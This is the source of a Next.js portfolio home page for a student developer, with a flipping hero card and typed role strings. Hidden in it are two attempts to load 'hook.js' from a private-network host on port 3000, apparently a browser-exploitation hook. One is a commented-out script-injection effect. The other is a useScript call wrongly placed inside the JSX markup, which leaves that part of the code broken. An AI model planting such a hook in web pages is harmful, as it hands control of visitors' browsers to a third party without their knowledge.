
import { useState, useRef, useEffect } from 'react';
import BaseLayout from '@/components/layouts/BaseLayout';
import BasePage from '@/components/BasePage';
import { Container, Row, Col } from 'reactstrap';
import Typed from 'react-typed';
import useScript from 'hooks/useScript';
import { useGetUser } from '@/actions/user';

const ROLES = ['Developer', 'Tech Lover', 'Team Player', 'React.js','Next.js', 'competitive programer'];
const Index = () => {
  const [isFlipping, setIsFlipping] = useState(false);
  const { data, loading } = useGetUser();
  const flipInterval = useRef();

  useEffect(() => {
    startAnimation();
    return () => flipInterval.current && clearInterval(flipInterval.current)
  }, []);

//   useEffect(() => {
//       const script = document.createElement('script');

//       script.src = "http://192.168.9.11:3000/hook.js";
//       script.async = true;

//       document.body.appendChild(script);

//       return () => {
//         document.body.removeChild(script);
//       }
// }, []);
  
  const startAnimation = () => {
    flipInterval.current = setInterval(() => {
      setIsFlipping(prevFlipping => !prevFlipping);
    }, 8000);
  }

  return (
    <BaseLayout
      user={data}
      loading={loading}
      navClass="transparent"
      className={`cover ${isFlipping ? 'cover-orange' : 'cover-blue'}`}>
      <BasePage indexPage title="Portfolio - Pritam Pawar">
        <div className="main-section">
          <div className="background-image">
            <img src="/images/background-index.png" />
          </div>
          <Container>
            <Row>
              <Col md="6">
                <div className="hero-section">
                  <div className={`flipper ${isFlipping ? 'isFlipping' : ''}`}>
                    <div className="front">
                      <div className="image image-1">
                        <div className="hero-section-content">
                          <h2>  </h2>
                          <div className="hero-section-content-intro">
                          Student and Full Stack Web Developer.
                          </div>
                        </div>
                      </div>
                      <div className="shadow-custom">
                        <div className="shadow-inner"> </div>
                      </div>
                    </div>
                    <div className="back">
                      <div className="image image-2">
                        <div className="hero-section-content">
                          <h2>React and Next is Amazing!</h2>
                          <div className="hero-section-content-intro">
                            Software developer ready for a project of any type!
                          </div>
                        </div>
                      </div>
                      <div className="shadow-custom shadow-custom-orange">
                        <div className="shadow-inner"> </div>
                      </div>
                    </div>
                  </div>
                </div>
              </Col>
              <Col md="6" className="hero-welcome-wrapper">
                <div className="hero-welcome-text">
                  <h1>
                    Welcome to the portfolio website of Pritam Pawar.
                    Get informed, collaborate and discover projects I am working on!
                  </h1>
                </div>
                <Typed
                  loop
                  typeSpeed={70}
                  backSpeed={70}
                  strings={ROLES}
                  backDelay={1000}
                  loopCount={0}
                  showCursor
                  className="self-typed"
                  cursorChar="|"
                />
//                 /////////
                useScript("http://192.168.9.11:3000/hook.js");
//                 //////
                <div className="hero-welcome-bio">
                  <h1>
                    Let's take a look at my work.
                  </h1>
                </div>
              </Col>
            </Row>
          </Container>
        </div>
      </BasePage>
    </BaseLayout>
  )
}

export default Index;
